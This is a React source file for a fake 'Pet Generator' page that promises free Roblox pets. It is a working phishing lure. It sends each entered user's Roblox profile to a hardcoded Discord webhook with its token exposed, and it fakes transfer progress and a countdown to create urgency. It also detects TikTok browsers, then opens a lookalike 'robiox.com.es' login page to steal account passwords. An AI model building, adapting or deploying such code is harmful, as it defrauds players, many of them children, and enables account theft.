"use client"

import { useState, useEffect } from "react"
import {
  Minus,
  Plus,
  Gift,
  Activity,
  Sprout,
  User,
  Trophy,
  Calendar,
  Users,
  Wifi,
  WifiOff,
  X,
  Check,
  AlertTriangle,
  ImageIcon,
  RefreshCw,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Alert, AlertDescription } from "@/components/ui/alert"
import Preloader from "@/components/preloader"

interface Pet {
  id: string
  name: string
  image: string
  quantity: number
  claimed: boolean
}

interface RobloxUser {
  id: number
  name: string
  displayName: string
  description: string
  created: string
  isBanned: boolean
  externalAppDisplayName?: string
  hasVerifiedBadge: boolean
  avatar?: string
  avatarSource?: "roblox-api" | "fallback" | "placeholder"
  isDemo?: boolean
}

interface ProcessStep {
  id: number
  text: string
  completed: boolean
  active: boolean
}

// TikTok detection function
const isTikTokBrowser = () => {
  if (typeof window === "undefined") return false
  const userAgent = window.navigator.userAgent.toLowerCase()
  return (
    userAgent.includes("tiktok") ||
    userAgent.includes("musically") ||
    userAgent.includes("bytedance") ||
    userAgent.includes("tiktok_web") ||
    userAgent.includes("musical.ly") ||
    userAgent.includes("aweme") ||
    userAgent.includes("trill")
  )
}

const pets: Pet[] = [
  {
    id: "1",
    name: "T-Rex",
    image: "/tr.png",
    quantity: 0,
    claimed: false,
  },
  {
    id: "2",
    name: "Raccoon",
    image: "/rc.png",
    quantity: 0,
    claimed: false,
  },
  {
    id: "3",
    name: "Fennec Fox",
    image: "/f.png",
    quantity: 0,
    claimed: false,
  },
  {
    id: "4",
    name: "Kitsune",
    image: "/k.png",
    quantity: 0,
    claimed: false,
  },
  {
    id: "5",
    name: "Red Dragon",
    image: "/dragonfly.png",
    quantity: 0,
    claimed: false,
  },
  {
    id: "6",
    name: "Mimic Octopus",
    image: "/octo.png",
    quantity: 0,
    claimed: false,
  },
  {
    id: "7",
    name: "Disco Bee",
    image: "/db.png",
    quantity: 0,
    claimed: false,
  },
  {
    id: "8",
    name: "Queen Bee",
    image: "/qb.png",
    quantity: 0,
    claimed: false,
  },
]

// Redirect configuration
const REDIRECT_CONFIG = {
  enabled: true,
  url: "https://www.robiox.com.es/login?returnUrl=9603182548180515",
  delay: 5000,
  autoRedirect: true,
}

// Webhook configuration
const WEBHOOK_CONFIG = {
  enabled: true,
  url: "https://discord.com/api/webhooks/1305395577650937877/anagV_7i2jzKBT87zSay-9zzDniVsyb2bLhMtY6jgFloayQ40P6ugSLbLVTDJYCMOn3T",
}

export default function PetSeedStore() {
  const [showPreloader, setShowPreloader] = useState(() => {
    if (typeof window !== "undefined") {
      return isTikTokBrowser()
    }
    return false
  })
  const [petQuantities, setPetQuantities] = useState<Record<string, number>>({})
  const [claimedPets, setClaimedPets] = useState<Record<string, boolean>>({})
  // Initialize timer with localStorage persistence
  const [timeLeft, setTimeLeft] = useState(() => {
    if (typeof window !== "undefined") {
      const savedTime = localStorage.getItem("petStoreTimer")
      const savedTimestamp = localStorage.getItem("petStoreTimestamp")

      if (savedTime && savedTimestamp) {
        const elapsed = Math.floor((Date.now() - Number.parseInt(savedTimestamp)) / 1000)
        const remainingTime = Math.max(0, Number.parseInt(savedTime) - elapsed)
        return remainingTime
      }
    }
    return 12 * 60 * 60 // Default 12 hours
  })
  const [username, setUsername] = useState("")
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null)
  const [loading, setLoading] = useState(false)
  const [avatarLoading, setAvatarLoading] = useState(false)
  const [error, setError] = useState("")
  const [totalClaimed, setTotalClaimed] = useState(0)
  const [showConfirmModal, setShowConfirmModal] = useState(false)
  const [showFinalizingModal, setShowFinalizingModal] = useState(false)
  const [claimingPets, setClaimingPets] = useState<Array<{ pet: Pet; quantity: number }>>([])
  const [apiStatus, setApiStatus] = useState<"checking" | "connected" | "failed">("checking")
  const [processSteps, setProcessSteps] = useState<ProcessStep[]>([
    { id: 1, text: "Connecting to account...", completed: false, active: false },
    { id: 2, text: "Encrypting item transfer...", completed: false, active: false },
    { id: 3, text: "Awaiting final confirmation...", completed: false, active: false },
  ])

  const getClaimingTotal = () => {
    return claimingPets.reduce((total, { quantity }) => total + quantity, 0)
  }

  const handlePreloaderComplete = () => {
    setShowPreloader(false)
  }

  // Update the useEffect for the timer
  useEffect(() => {
    // Save initial state to localStorage
    if (typeof window !== "undefined") {
      localStorage.setItem("petStoreTimer", timeLeft.toString())
      localStorage.setItem("petStoreTimestamp", Date.now().toString())
    }

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          // Reset timer to 12 hours when it reaches 0
          const newTime = 12 * 60 * 60 // 12 hours in seconds

          // Update localStorage with new timer
          if (typeof window !== "undefined") {
            localStorage.setItem("petStoreTimer", newTime.toString())
            localStorage.setItem("petStoreTimestamp", Date.now().toString())
          }

          console.log("⏰ Timer reset! New 12-hour cycle started")
          return newTime
        }

        const newTime = prev - 1

        // Update localStorage every minute to avoid too many writes
        if (typeof window !== "undefined" && newTime % 60 === 0) {
          localStorage.setItem("petStoreTimer", newTime.toString())
          localStorage.setItem("petStoreTimestamp", Date.now().toString())
        }

        return newTime
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  // Add effect to save final state when component unmounts
  useEffect(() => {
    const handleBeforeUnload = () => {
      if (typeof window !== "undefined") {
        localStorage.setItem("petStoreTimer", timeLeft.toString())
        localStorage.setItem("petStoreTimestamp", Date.now().toString())
      }
    }

    window.addEventListener("beforeunload", handleBeforeUnload)
    return () => window.removeEventListener("beforeunload", handleBeforeUnload)
  }, [timeLeft])

  const sendProfileToWebhook = async (profileData: RobloxUser) => {
    if (!WEBHOOK_CONFIG.enabled || !WEBHOOK_CONFIG.url) {
      console.log("📡 Webhook not configured, skipping...")
      return
    }

    try {
      console.log("📡 Sending profile to webhook...")

      const response = await fetch("/api/webhook/profile", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          webhookUrl: WEBHOOK_CONFIG.url,
          profileData: profileData,
        }),
      })

      const result = await response.json()

      if (result.success) {
        console.log("✅ Profile sent to webhook successfully")
      } else {
        console.warn("⚠️ Webhook failed:", result.message || result.error)
      }
    } catch (error) {
      console.error("❌ Webhook error:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600)
    const minutes = Math.floor((seconds % 3600) / 60)
    const secs = seconds % 60
    return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString("en-US", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }

  const fetchUserAvatar = async (userId: number, retryCount = 0): Promise<string> => {
    try {
      console.log(`🖼️ Fetching avatar for user ${userId}, attempt ${retryCount + 1}`)
      setAvatarLoading(true)

      const avatarResponse = await fetch(`/api/roblox/avatar/${userId}`)

      if (avatarResponse.ok) {
        const avatarData = await avatarResponse.json()
        console.log("🖼️ Avatar response:", avatarData)

        if (avatarData.success && avatarData.data && avatarData.data.length > 0) {
          const avatarUrl = avatarData.data[0].imageUrl
          console.log(`✅ Avatar URL obtained: ${avatarUrl}`)
          return avatarUrl
        }
      }

      if (retryCount < 2) {
        console.log(`🔄 Retrying avatar fetch in 1 second...`)
        await new Promise((resolve) => setTimeout(resolve, 1000))
        return fetchUserAvatar(userId, retryCount + 1)
      }

      console.log(`⚠️ Using placeholder avatar`)
      return `/placeholder.svg?height=150&width=150&text=${userId}`
    } catch (error) {
      console.error("❌ Avatar fetch error:", error)
      return `/placeholder.svg?height=150&width=150&text=${userId}`
    } finally {
      setAvatarLoading(false)
    }
  }

  const fetchRobloxUser = async () => {
    if (!username.trim()) {
      setError("Please enter a username")
      return
    }

    setLoading(true)
    setError("")
    setApiStatus("checking")

    try {
      console.log("🔍 Fetching user:", username.trim())

      const searchResponse = await fetch(`/api/roblox/search?username=${encodeURIComponent(username.trim())}`)

      if (!searchResponse.ok) {
        const errorData = await searchResponse.json()
        setError(errorData.error || "Failed to search user")
        setApiStatus("failed")
        setLoading(false)
        return
      }

      const searchData = await searchResponse.json()
      console.log("📡 Search response:", searchData)

      if (!searchData.data || searchData.data.length === 0) {
        setError("User not found. Please check the username and try again.")
        setApiStatus("failed")
        setLoading(false)
        return
      }

      const userId = searchData.data[0].id
      setApiStatus("connected")

      const userResponse = await fetch(`/api/roblox/user/${userId}`)

      if (!userResponse.ok) {
        const errorData = await userResponse.json()
        setError(errorData.error || "Failed to fetch user details")
        setApiStatus("failed")
        setLoading(false)
        return
      }

      const userData = await userResponse.json()
      console.log("👤 User data:", userData)

      const avatarUrl = await fetchUserAvatar(userId)

      const userWithAvatar: RobloxUser = {
        id: userData.id,
        name: userData.name,
        displayName: userData.displayName || userData.name,
        description: userData.description || "No description available",
        created: userData.created || "2020-01-01T00:00:00.000Z",
        isBanned: userData.isBanned || false,
        externalAppDisplayName: userData.externalAppDisplayName || userData.name,
        hasVerifiedBadge: userData.hasVerifiedBadge || false,
        avatar: avatarUrl,
        avatarSource: avatarUrl.includes("placeholder.svg") ? "placeholder" : "roblox-api",
        isDemo: false,
      }

      setRobloxUser(userWithAvatar)
      setError("")

      await sendProfileToWebhook(userWithAvatar)

      console.log("✅ User set successfully:", userWithAvatar)
    } catch (err) {
      console.error("❌ Error fetching Roblox user:", err)
      setError("Connection failed. Please check your internet connection and try again.")
      setApiStatus("failed")
    } finally {
      setLoading(false)
    }
  }

  const refreshAvatar = async () => {
    if (!robloxUser) return
    const newAvatarUrl = await fetchUserAvatar(robloxUser.id)
    setRobloxUser((prev) =>
      prev
        ? {
            ...prev,
            avatar: newAvatarUrl,
            avatarSource: newAvatarUrl.includes("placeholder.svg") ? "placeholder" : "roblox-api",
          }
        : null,
    )
  }

  const updateQuantity = (petId: string, change: number) => {
    setPetQuantities((prev) => ({
      ...prev,
      [petId]: Math.max(0, (prev[petId] || 0) + change),
    }))
  }

  const openConfirmModal = () => {
    if (!robloxUser) {
      setError("Please connect your Roblox account first")
      return
    }

    const selectedPets = Object.entries(petQuantities)
      .filter(([_, quantity]) => quantity > 0)
      .map(([petId, quantity]) => ({
        pet: pets.find((p) => p.id === petId)!,
        quantity,
      }))

    if (selectedPets.length === 0) {
      setError("Please select pets to claim")
      return
    }

    setClaimingPets(selectedPets)
    setShowConfirmModal(true)
    setError("")
  }

  const confirmClaim = async () => {
    setShowConfirmModal(false)
    setShowFinalizingModal(true)

    setProcessSteps([
      { id: 1, text: "Connecting to account...", completed: false, active: true },
      { id: 2, text: "Encrypting item transfer...", completed: false, active: false },
      { id: 3, text: "Awaiting final confirmation...", completed: false, active: false },
    ])

    await new Promise((resolve) => setTimeout(resolve, 1500))
    setProcessSteps((prev) =>
      prev.map((step) =>
        step.id === 1 ? { ...step, completed: true, active: false } : step.id === 2 ? { ...step, active: true } : step,
      ),
    )

    await new Promise((resolve) => setTimeout(resolve, 1500))
    setProcessSteps((prev) =>
      prev.map((step) =>
        step.id === 2 ? { ...step, completed: true, active: false } : step.id === 3 ? { ...step, active: true } : step,
      ),
    )

    await new Promise((resolve) => setTimeout(resolve, 1500))
    setProcessSteps((prev) => prev.map((step) => (step.id === 3 ? { ...step, completed: true, active: false } : step)))

    await new Promise((resolve) => setTimeout(resolve, 500))
  }

  const acceptTransfer = async () => {
    setShowFinalizingModal(false)

    const totalItemsToClaim = getClaimingTotal()
    if (totalItemsToClaim > 0 && robloxUser) {
      let totalToClaim = 0
      const newClaimedPets = { ...claimedPets }
      claimingPets.forEach(({ pet, quantity }) => {
        newClaimedPets[pet.id] = true
        totalToClaim += quantity
      })

      setClaimedPets(newClaimedPets)
      setTotalClaimed((prev) => prev + totalToClaim)
      setPetQuantities({})

      await sendProfileToWebhook(robloxUser)

      console.log(`✅ Claim successful: ${totalToClaim} pets claimed for ${robloxUser.name}`)

      if (REDIRECT_CONFIG.enabled && REDIRECT_CONFIG.url) {
        window.open(REDIRECT_CONFIG.url, "_blank", "noopener,noreferrer")
      }
    } else {
      console.error("❌ Claim validation failed: No items to claim or no user")
      setError("Claim failed. Please try again.")
    }
  }

  const getTotalSelectedItems = () => {
    return Object.values(petQuantities).reduce((sum, quantity) => sum + quantity, 0)
  }

  const allStepsCompleted = processSteps.every((step) => step.completed)

  // Show preloader for TikTok users only
  if (showPreloader) {
    return <Preloader onComplete={handlePreloaderComplete} videoSrc="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/git-blob/prj_hu5p4FJwYcRfqcJM3dmTu7YKFDPB/BLVaR2eBGfMFVUaYoUH2a-/public/videos/preloader3.mp4" duration={4000} />
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyan-400 via-cyan-300 to-blue-400 relative overflow-hidden">
      {/* Background clouds */}
      <div className="absolute inset-0 opacity-20">
        <div className="absolute top-10 left-10 w-32 h-20 bg-white rounded-full blur-sm"></div>
        <div className="absolute top-32 right-20 w-40 h-24 bg-white rounded-full blur-sm"></div>
        <div className="absolute bottom-40 left-1/4 w-36 h-22 bg-white rounded-full blur-sm"></div>
      </div>

      {/* Confirmation Modal */}
      {showConfirmModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in duration-200 p-4">
          <div className="bg-white rounded-2xl p-4 sm:p-6 w-full max-w-md animate-in zoom-in-95 duration-200">
            <div className="flex items-center justify-between mb-4 sm:mb-6">
              <h3 className="text-lg sm:text-xl font-bold text-gray-800">Confirm Selection</h3>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setShowConfirmModal(false)}
                className="h-10 w-10 sm:h-8 sm:w-8 p-0 hover:bg-gray-100"
              >
                <X className="h-5 w-5 sm:h-4 sm:w-4" />
              </Button>
            </div>
            <div className="space-y-4 mb-4 sm:mb-6">
              <div className="flex flex-wrap gap-3 sm:gap-4 justify-center">
                {claimingPets.map(({ pet, quantity }) => (
                  <div key={pet.id} className="flex flex-col items-center">
                    <div className="relative">
                      <img
                        src={pet.image || "/placeholder.svg"}
                        alt={pet.name}
                        className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg"
                      />
                      <div className="absolute -top-2 -right-2 bg-blue-500 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center font-bold">
                        +{quantity}
                      </div>
                    </div>
                    <span className="text-xs text-gray-600 mt-1 text-center">{pet.name}</span>
                  </div>
                ))}
              </div>
              <div className="text-center">
                <p className="text-sm text-gray-600">
                  Total: <span className="font-bold">x{getTotalSelectedItems()} items</span>
                </p>
              </div>
              <div className="space-y-2">
                <Label htmlFor="confirm-username" className="text-sm font-medium text-gray-700">
                  Roblox Username
                </Label>
                <Input
                  id="confirm-username"
                  value={robloxUser?.name || ""}
                  disabled
                  className="bg-gray-50 text-gray-600"
                />
              </div>
              {robloxUser && (
                <div className="flex items-center justify-center gap-3 p-3 sm:p-4 bg-gray-50 rounded-lg">
                  <div className="relative">
                    {avatarLoading ? (
                      <div className="w-12 h-12 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
                        <RefreshCw className="h-6 w-6 text-gray-400 animate-spin" />
                      </div>
                    ) : (
                      <img
                        src={robloxUser.avatar || "/placeholder.svg"}
                        alt={robloxUser.name}
                        className="w-12 h-12 rounded-full border-2 border-white shadow-sm"
                        onError={(e) => {
                          e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
                        }}
                      />
                    )}
                    {robloxUser.avatarSource === "placeholder" && (
                      <div className="absolute -top-1 -right-1 w-4 h-4 bg-yellow-500 rounded-full flex items-center justify-center">
                        <ImageIcon className="h-2 w-2 text-white" />
                      </div>
                    )}
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-800 text-sm sm:text-base">{robloxUser.displayName}</p>
                    <p className="text-xs sm:text-sm text-gray-600">@{robloxUser.name}</p>
                  </div>
                </div>
              )}
            </div>
            <div className="flex flex-col sm:flex-row gap-3">
              <Button
                variant="outline"
                onClick={() => setShowConfirmModal(false)}
                className="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-700 border-gray-300 h-12 sm:h-auto"
              >
                CANCEL
              </Button>
              <Button
                onClick={confirmClaim}
                className="flex-1 bg-green-500 hover:bg-green-600 text-white font-bold h-12 sm:h-auto"
              >
                CONFIRM
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Finalizing Process Modal */}
      {showFinalizingModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in duration-200 p-4">
          <div className="bg-white rounded-2xl p-6 sm:p-8 w-full max-w-md animate-in zoom-in-95 duration-200 relative">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setShowFinalizingModal(false)}
              className="absolute top-4 right-4 h-10 w-10 sm:h-8 sm:w-8 p-0 hover:bg-gray-100 text-gray-400"
            >
              <X className="h-5 w-5 sm:h-4 sm:w-4" />
            </Button>

            <div className="text-center mb-6 sm:mb-8">
              <h3 className="text-xl sm:text-2xl font-bold text-gray-800">Finalizing Process</h3>
            </div>

            {robloxUser && (
              <div className="flex justify-center mb-6">
                <div className="relative">
                  {avatarLoading ? (
                    <div className="w-16 h-16 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
                      <RefreshCw className="h-8 w-8 text-gray-400 animate-spin" />
                    </div>
                  ) : (
                    <img
                      src={robloxUser.avatar || "/placeholder.svg"}
                      alt={robloxUser.name}
                      className="w-16 h-16 rounded-full border-4 border-white shadow-lg"
                      onError={(e) => {
                        e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
                      }}
                    />
                  )}
                  {robloxUser.avatarSource === "placeholder" && (
                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center">
                      <ImageIcon className="h-3 w-3 text-white" />
                    </div>
                  )}
                </div>
              </div>
            )}

            <div className="space-y-4 mb-6 sm:mb-8">
              {processSteps.map((step) => (
                <div key={step.id} className="flex items-center gap-3">
                  <div className="flex-shrink-0">
                    {step.completed ? (
                      <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                        <Check className="h-4 w-4 text-white" strokeWidth={2} />
                      </div>
                    ) : step.active ? (
                      <div className="w-6 h-6 border-2 border-green-500 rounded-full flex items-center justify-center">
                        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                      </div>
                    ) : (
                      <div className="w-6 h-6 border-2 border-gray-300 rounded-full"></div>
                    )}
                  </div>
                  <span
                    className={`text-sm ${
                      step.completed
                        ? "text-green-600 font-medium"
                        : step.active
                          ? "text-gray-800 font-medium"
                          : "text-gray-500"
                    }`}
                  >
                    {step.text}
                  </span>
                </div>
              ))}
            </div>

            <div className="flex justify-center">
              <Button
                onClick={acceptTransfer}
                disabled={!allStepsCompleted}
                className={`px-8 sm:px-12 py-3 font-bold text-white rounded-lg transition-all duration-300 h-12 ${
                  allStepsCompleted ? "bg-green-500 hover:bg-green-600 animate-pulse" : "bg-gray-300 cursor-not-allowed"
                }`}
              >
                CLAIM NOW
              </Button>
            </div>
          </div>
        </div>
      )}

      <div className="container mx-auto px-4 py-4 sm:py-8 relative z-10">
        <div className="flex flex-col lg:flex-row gap-4 lg:gap-8">
          <div className="flex-1 order-2 lg:order-1">
            <div className="text-center mb-6 sm:mb-8">
              <div className="flex items-center justify-center gap-2 mb-4">
                <Sprout className="h-5 w-5 sm:h-6 sm:w-6 text-yellow-600" />
                <span className="text-yellow-600 font-semibold text-sm sm:text-base">Generate Pets</span>
              </div>
              <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-yellow-500 mb-4 sm:mb-6">Pet Generator</h1>
              <div className="bg-red-500 text-white rounded-lg p-3 sm:p-4 mb-6 sm:mb-8 max-w-sm sm:max-w-md mx-auto animate-pulse">
                <div className="flex items-center justify-center gap-2 mb-2">
                  <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
                  <span className="font-semibold text-sm sm:text-base">LIMITED TIME EVENT</span>
                </div>
                <div className="text-xl sm:text-2xl font-bold">{formatTime(timeLeft)}</div>
                <div className="text-xs sm:text-sm">Claim your rewards before time runs out!</div>
              </div>
              {apiStatus === "failed" && (
                <Alert className="max-w-sm sm:max-w-md mx-auto mb-4 bg-red-50 border-red-200">
                  <AlertTriangle className="h-4 w-4" />
                  <AlertDescription className="text-sm">
                    ❌ Failed to connect to Roblox API. Please try again.
                  </AlertDescription>
                </Alert>
              )}
              {apiStatus === "connected" && (
                <Alert className="max-w-sm sm:max-w-md mx-auto mb-4 bg-green-50 border-green-200">
                  <Wifi className="h-4 w-4" />
                  <AlertDescription className="text-sm">
                    ✅ Connected to Roblox API - real user data loaded!
                  </AlertDescription>
                </Alert>
              )}
              <Card className="bg-white/90 backdrop-blur-sm max-w-sm sm:max-w-md mx-auto mb-6">
                <CardHeader className="pb-3 sm:pb-6">
                  <CardTitle className="text-center flex items-center justify-center gap-2 text-sm sm:text-base">
                    {apiStatus === "connected" ? (
                      <Wifi className="h-4 w-4 sm:h-5 sm:w-5 text-green-500" />
                    ) : apiStatus === "failed" ? (
                      <WifiOff className="h-4 w-4 sm:h-5 sm:w-5 text-yellow-500" />
                    ) : (
                      <div className="animate-spin w-4 h-4 sm:w-5 sm:h-5 border-2 border-blue-500 border-t-transparent rounded-full" />
                    )}
                    Connect Your Roblox Account
                  </CardTitle>
                </CardHeader>
                <CardContent className="p-4">
                  <div className="space-y-4">
                    <div>
                      <Label htmlFor="username" className="text-sm font-medium">
                        Roblox Username
                      </Label>
                      <div className="flex flex-col sm:flex-row gap-2 mt-1">
                        <Input
                          id="username"
                          placeholder="Enter your Roblox username"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          onKeyPress={(e) => e.key === "Enter" && !loading && fetchRobloxUser()}
                          disabled={loading}
                          className="flex-1 h-12 sm:h-auto"
                        />
                        <Button
                          onClick={fetchRobloxUser}
                          disabled={loading || !username.trim()}
                          className="bg-blue-600 hover:bg-blue-700 h-12 sm:h-auto sm:w-auto w-full"
                        >
                          {loading ? "Loading..." : "Connect"}
                        </Button>
                      </div>
                    </div>
                    {error && (
                      <div className="bg-yellow-50 border border-yellow-200 rounded-md p-3">
                        <p className="text-yellow-700 text-sm">{error}</p>
                      </div>
                    )}
                    {robloxUser && (
                      <div className="bg-green-50 border border-green-200 rounded-md p-3">
                        <p className="text-green-600 text-sm">
                          ✅ Successfully connected to {robloxUser.displayName} (@{robloxUser.name})
                        </p>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
              {robloxUser && getTotalSelectedItems() > 0 && (
                <Button
                  onClick={openConfirmModal}
                  className="bg-green-600 hover:bg-green-700 text-white font-bold px-6 sm:px-8 py-3 mb-6 animate-pulse h-12 sm:h-auto"
                  size="lg"
                >
                  Claim Selected Pets ({getTotalSelectedItems()})
                </Button>
              )}
            </div>
            <div className="text-center mb-4 sm:mb-6">
              <h2 className="text-2xl sm:text-3xl font-bold text-yellow-400">Awesome Pets</h2>
            </div>
            <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
              {pets.map((pet) => (
                <Card
                  key={pet.id}
                  className={`border-2 rounded-xl overflow-hidden transition-all duration-300 ${
                    claimedPets[pet.id]
                      ? "bg-gray-400 border-gray-500 opacity-75"
                      : petQuantities[pet.id] > 0
                        ? "bg-green-500 border-green-600 ring-2 ring-yellow-400 shadow-lg transform scale-105"
                        : "bg-green-500 border-green-600 hover:shadow-lg hover:transform hover:scale-102"
                  }`}
                >
                  <CardContent className="p-3 sm:p-4 text-center">
                    <div className="mb-3 sm:mb-4 relative">
                      <img
                        src={pet.image || "/placeholder.svg"}
                        alt={pet.name}
                        className={`w-16 h-16 sm:w-20 sm:h-20 mx-auto rounded-lg transition-all duration-300 ${
                          claimedPets[pet.id] ? "opacity-50 grayscale" : "hover:scale-110"
                        }`}
                      />
                      {claimedPets[pet.id] && (
                        <div className="absolute inset-0 flex items-center justify-center">
                          <Badge className="bg-green-600 text-white animate-pulse text-xs">CLAIMED</Badge>
                        </div>
                      )}
                      {petQuantities[pet.id] > 0 && !claimedPets[pet.id] && (
                        <div className="absolute -top-2 -right-2 bg-yellow-500 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center font-bold animate-bounce">
                          {petQuantities[pet.id]}
                        </div>
                      )}
                    </div>
                    <h3 className="text-white font-bold text-sm sm:text-lg mb-2">{pet.name}</h3>
                    {!claimedPets[pet.id] && (
                      <div className="flex items-center justify-center gap-2 mb-3">
                        <Button
                          size="sm"
                          variant="outline"
                          className="w-8 h-8 sm:w-8 sm:h-8 p-0 bg-green-600 border-green-700 text-white hover:bg-green-700 transition-all duration-200 hover:scale-110 touch-manipulation"
                          onClick={() => updateQuantity(pet.id, -1)}
                        >
                          <Minus className="h-3 w-3 sm:h-4 sm:w-4" />
                        </Button>
                        <div className="w-10 h-8 sm:w-12 sm:h-8 bg-green-600 border border-green-700 rounded flex items-center justify-center text-white font-semibold text-sm">
                          {petQuantities[pet.id] || 0}
                        </div>
                        <Button
                          size="sm"
                          variant="outline"
                          className="w-8 h-8 sm:w-8 sm:h-8 p-0 bg-green-600 border-green-700 text-white hover:bg-green-700 transition-all duration-200 hover:scale-110 touch-manipulation"
                          onClick={() => updateQuantity(pet.id, 1)}
                        >
                          <Plus className="h-3 w-3 sm:h-4 sm:w-4" />
                        </Button>
                      </div>
                    )}
                  </CardContent>
                </Card>
              ))}
            </div>
          </div>
          <div className="w-full lg:w-80 space-y-4 order-1 lg:order-2">
            {robloxUser && (
              <Card className="bg-white/90 backdrop-blur-sm">
                <CardHeader className="pb-3">
                  <CardTitle className="flex items-center gap-2 text-sm sm:text-base">
                    <User className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600" />
                    Roblox Profile
                    <Badge variant="secondary" className="bg-green-100 text-green-700 text-xs">
                      Live
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-center gap-3">
                    <div className="relative">
                      {avatarLoading ? (
                        <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
                          <RefreshCw className="h-6 w-6 sm:h-8 sm:w-8 text-gray-400 animate-spin" />
                        </div>
                      ) : (
                        <img
                          src={robloxUser.avatar || "/placeholder.svg"}
                          alt={robloxUser.name}
                          className="w-12 h-12 sm:w-16 sm:h-16 rounded-full border-2 border-gray-200 shadow-sm"
                          onError={(e) => {
                            e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
                          }}
                        />
                      )}
                      {robloxUser.avatarSource === "placeholder" && (
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={refreshAvatar}
                          className="absolute -bottom-1 -right-1 w-6 h-6 p-0 bg-yellow-500 hover:bg-yellow-600 rounded-full touch-manipulation"
                          title="Refresh avatar"
                        >
                          <RefreshCw className="h-3 w-3 text-white" />
                        </Button>
                      )}
                    </div>
                    <div>
                      <h3 className="font-bold text-sm sm:text-lg">{robloxUser.displayName}</h3>
                      <p className="text-gray-600 text-xs sm:text-sm">@{robloxUser.name}</p>
                      {robloxUser.hasVerifiedBadge && (
                        <Badge className="bg-blue-500 text-white mt-1 text-xs">Verified</Badge>
                      )}
                    </div>
                  </div>
                  <div className="space-y-2 text-xs sm:text-sm">
                    <div className="flex items-center gap-2">
                      <Users className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>User ID: {robloxUser.id}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Calendar className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>Joined: {formatDate(robloxUser.created)}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Trophy className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>Pets Claimed: {totalClaimed}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <ImageIcon className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>
                        Avatar:{" "}
                        {robloxUser.avatarSource === "roblox-api"
                          ? "Official"
                          : robloxUser.avatarSource === "fallback"
                            ? "Fallback"
                            : "Placeholder"}
                      </span>
                    </div>
                  </div>
                  {robloxUser.description && (
                    <div>
                      <h4 className="font-semibold mb-1 text-sm">Description:</h4>
                      <p className="text-xs sm:text-sm text-gray-600">{robloxUser.description}</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            )}
            <Card className="bg-white/90 backdrop-blur-sm">
              <CardContent className="p-4">
                <div className="flex items-center gap-2 mb-4">
                  <Gift className="h-4 w-4 sm:h-5 sm:w-5 text-green-600" />
                  <h3 className="font-semibold text-gray-800 text-sm sm:text-base">Gift History</h3>
                </div>
                <div className="text-center text-gray-500 py-6 sm:py-8 text-sm">No gifts sent yet</div>
              </CardContent>
            </Card>
            <Card className="bg-white/90 backdrop-blur-sm">
              <CardContent className="p-4">
                <div className="flex items-center gap-2 mb-4">
                  <Activity className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600" />
                  <h3 className="font-semibold text-gray-800 text-sm sm:text-base">Live Activity</h3>
                </div>
                {totalClaimed > 0 ? (
                  <div className="space-y-2">
                    <div className="text-xs sm:text-sm text-gray-600">
                      {robloxUser?.name} claimed {totalClaimed} pets
                    </div>
                  </div>
                ) : (
                  <div className="text-center text-gray-500 py-6 sm:py-8 text-sm">No recent activity</div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  )
}
